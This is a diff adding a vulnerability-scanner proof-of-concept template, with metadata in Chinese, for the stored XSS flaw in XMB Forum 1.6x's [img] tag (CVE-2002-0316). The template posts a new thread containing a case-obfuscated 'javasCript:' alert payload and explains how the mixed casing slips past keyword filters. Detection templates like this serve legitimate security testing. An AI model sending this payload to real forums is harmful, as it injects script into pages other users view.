@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "检测 XMB Forum 1.6x 及更早版本中 [img] BBCode 标签跨站脚本漏洞（CVE-2002-0316）。远程攻击者可通过在论坛帖子中插入 [img]javasCript:alert('XSS')[/img] 绕过 HTML/JavaScript 过滤，当其他用户浏览帖子时 JavaScript 在浏览器中自动执行。漏洞源于对 [img] 标签的 URL 参数未过滤 javascript: 协议，且大小写混淆可绕过简单关键词过滤"
+id = "POC-AVE-2002-0258"
+name = "XMB Forum 1.6x [img] Tag XSS PoC"
+severity = "high"
+tags = ["ave-2002-0258"]
+vuln_id = [
+    "CVE-2002-0316",
+    "AVE-2002-0258",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/post.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=newthread&fid=1&subject=Security+Test&message=%5Bimg%5DjavasCript%3Aalert(%27XSS%27)%5B%2Fimg%5D&postsubmit=true"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    302,
+    301,
+    200,
+]
+type = "status"
